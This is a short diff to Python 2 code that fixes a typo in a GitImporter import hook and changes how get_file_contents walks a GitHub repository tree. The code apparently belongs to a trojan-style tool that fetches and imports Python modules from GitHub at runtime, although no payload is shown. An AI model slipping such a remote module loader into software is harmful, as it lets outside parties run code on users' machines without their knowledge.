@@ -27,7 +27,7 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
 
-    def find_module(self,fulname,path=None):
+    def find_module(self,fullname,path=None):
 
         if configured:
             print '[*] Attempting to retrieve %s' % fullname
@@ -71,7 +71,7 @@ def connect_to_github():
 def get_file_contents(filepath):
     gh,repo,branch = connect_to_github()
 
-    tree = branch.commit.commit.tree.recurse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
 
     for filename in tree.tree:
         if filepath in filename.path:
